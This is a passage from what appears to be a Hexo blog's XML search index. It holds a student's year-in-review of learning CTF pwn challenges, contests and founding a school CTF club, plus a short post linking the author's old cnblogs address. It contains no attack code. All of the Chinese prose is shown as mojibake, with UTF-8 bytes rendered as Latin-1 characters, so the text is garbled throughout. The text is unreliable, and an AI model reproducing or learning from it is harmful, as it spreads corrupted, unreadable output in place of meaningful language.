†éƒ¨åˆ†åªæœ‰ä¸€ä¸¢ä¸¢ï¼Œä½†æ˜¯å¾ˆæ»¡è¶³äº†ï¼Œæ…¢æ…¢å•ƒwikiï¼Œæœ€åè¿˜æ˜¯å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ã€‚</p><h2 id="8-9æœˆ"><a href="#8-9æœˆ" class="headerlink" title="8-9æœˆ"></a>8-9æœˆ</h2><p>æ—…æ¸¸ï¼Œå„ç§ç©è€ï¼Œå’•äº†</p><h2 id="9-12æœˆ"><a href="#9-12æœˆ" class="headerlink" title="9-12æœˆ"></a>9-12æœˆ</h2><p>ä¸‹å­¦æœŸå¼€å§‹äº†ï¼Œæ–°ç­çº§ï¼Œå¸¦äº†ä¸€ä¸ªèˆå‹å¼€å§‹å­¦ctfï¼ŒåŒç­åŒå­¦ç¢°è§ä¸€ä¸ªç‰¹åˆ«å¼ºçš„å¸ˆå‚…ï¼Œåæ¥è®¤è¯†äº†ä¸€ä¸‹æ‰çŸ¥é“è¿™ä¸ªå¸ˆå‚…æ˜¯è®¡ç®—æœºå¤§ç±»çš„ç³»ç¬¬ä¸€ï¼Œé«˜ä¸­å°±å¼€å§‹ææŠ€æœ¯äº†ï¼Œwebæ‰‹ï¼Œè†œã€‚ç„¶åç»§ç»­pwnï¼ŒåŸºæœ¬ä¸Šä¸€å¤©ä¸¤åˆ°ä¸‰ä¸ªbuuå§ï¼Œä¸ä¼šå°±è®°å½•æŸ¥wpï¼ŒæŠ€æœ¯ä¸Šæ˜¯æœ‰ä¸€å®šè¿›æ­¥çš„ï¼Œç„¶åæ‰“äº†çœçš„ä¸€ä¸ªå°æ¯”èµ›æ‹¿äº†ä¸€ä¸ªäºŒç­‰å¥–ï¼Œåæ¥è·Ÿwebå¸ˆå‚…ç»„é˜Ÿåˆæ‰“äº†ä¸€ä¸ªçº¿ä¸‹èµ›æ‹¿äº†ç¬¬ä¸€åï¼ŒæŒºæ»¡æ„çš„ã€‚ç„¶åé™†é™†ç»­ç»­åšé¢˜ï¼ŒæŠŠbuuçš„ä¸€åˆ†pwnåšå®Œäº†ï¼Œå½“æ—¶pwnæ€»æ¦œæ’åä¹Ÿè¿›å…¥å‰50äº†ï¼Œç„¶åå°±æ˜¯å¤ä¹ è¯¾å‡†å¤‡è€ƒè¯•äº†ï¼Œä¸­é—´è¿˜æˆç«‹äº†æˆ‘ä»¬æ ¡çš„ç¬¬ä¸€ä¸ªctfç¤¾å›¢ï¼Œæ„Ÿè°¢å„ä½è€å¸ˆçš„æ”¯æŒå’Œå¸®åŠ©</p><h2 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h2><p>æœ€ç»ˆå¯’å‡æ¥äº†ï¼Œæ‘¸äº†ä¸€ä¸ªå¯’å‡ï¼Œå­¦äº†å‡ å¤©çš„è¿ç»´</p><p>2021å¼€å­¦äº†ï¼Œå‡†å¤‡ç»§ç»­å­¦pwnï¼Œå †éƒ¨åˆ†è¿˜æ²¡æœ‰ç»“æŸï¼Œè¿˜æ˜¯è·Ÿå¸ˆå‚…ä»¬å·®çš„å¤ªè¿œï¼Œä¸è¿‡è¿™ä¸€å¹´è®¤è¯†å¾ˆå¤šhxdï¼Œæ ¡å†…å¸ˆå‚…ä¸ç”¨è¯´äº†ï¼Œå †å †å¸ˆå‚…ï¼Œä¸ƒæ˜Ÿå¸ˆå‚…ï¼Œé›ªæ®‡å¸ˆå‚…ï¼ŒMz1å¸ˆå‚…ï¼ŒFzå¸ˆå‚…ï¼ŒNç¥ï¼Œä½è°ƒçš„L0ne1yå¸ˆå‚…ç­‰ç­‰ï¼Œè·¯å¾ˆé•¿ï¼ŒåŠ æ²¹ï¼Œå…±å‹‰ï¼</p>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‚è°ˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>New</title>
      <link href="2021/03/05/New/"/>
      <url>2021/03/05/New/</url>
      
        <content type="html"><![CDATA[<h3 id="æ–°åšå®¢ï¼"><a href="#æ–°åšå®¢ï¼" class="headerlink" title="æ–°åšå®¢ï¼"></a>æ–°åšå®¢ï¼</h3><p>åŸåšå®¢åœ°å€ï¼š<a href="https://cnblogs.com/lemon629/">https://cnblogs.com/lemon629/</a></p>]]></content>
      
      
      <categories>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‚è°ˆ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
